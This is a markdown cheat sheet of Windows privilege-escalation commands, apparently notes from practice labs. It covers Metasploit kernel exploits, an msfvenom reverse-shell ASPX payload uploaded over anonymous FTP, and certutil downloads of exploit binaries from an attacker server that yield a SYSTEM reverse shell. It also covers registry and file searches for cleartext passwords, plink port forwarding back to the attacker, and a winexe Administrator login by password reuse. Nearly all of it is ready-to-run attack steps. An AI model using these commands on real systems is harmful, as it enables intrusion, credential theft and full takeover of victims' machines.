# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)
2. [Passwords and Port Forwarding](#passwords-and-port-forwarding)

## Kernel Exploits

* [Reference for Windows Kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

```shell
#metasploit kernel exploitation
#exploit suggested by exploit suggester
use exploit/windows/local/ms10_015_kitrap0d

options

set SESSION 9

set LHOST tun0

set LPORT 5555
#gives meterpreter shell
getuid
```

```shell
#manual kernel exploitation
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > manual.aspx
#create aspx shell

ftp 10.10.10.5
#anonymous login

put manual.aspx

exit

nc -lvnp 4444
#setup listener
#check uploaded aspx shell on web
#we get a reverse shell

whoami
#iis apppool\web

#in attacker machine
#check for vulnerable kernel exploits using windows exploit suggester
#and download exploit files for MS10-059
python3 -m http.server

#in victim shell
cd C:\Windows\Temp

certutil -urlcache -f http://10.10.14.5:8000/ms10-059.exe ms.exe

#setup listener on attacker machine
nc -nvlp 5555

#in victim shell
ms.exe 10.10.14.5 5555

#we get reverse shell on port 5555 listener
whoami
#system
```

## Passwords and Port Forwarding

```shell
systeminfo

whoami

net users

net user alfred
#check groups

ipconfig

netstat -ano
#check open ports

arp -a

#hunting for cleartext passwords
findstr /si password *.txt

#search in registry
reg query HKLM /f password /t REG_SZ /s
#preferred method

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#attempt in case of password reuse
#we can use port forwarding method using plink.exe

#in attacker machine
python3 -m http.server

#in victim machine
cd C:\Users\alfred

certutil -urlcache -f http://10.10.14.2:8000/plink.exe plink.exe

#in attacker machine
#for plink config
sudo apt install ssh

sudo gedit /etc/ssh.sshd_config
#edit to enable permitrootlogin

sudo service ssh restart
sudo service ssh start

#in victim machine
plink.exe -l root -pw passwordHere -R 445:127.0.0.1:445 10.10.14.2
#access port 445 of victim machine from port 445 of attacker machine

#we get attacker shell in victim session
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
#winexe to run Windows commands on Linux
#127.0.0.1 as we are using port forwarding
#password reuse

whoami
#Administrator
```
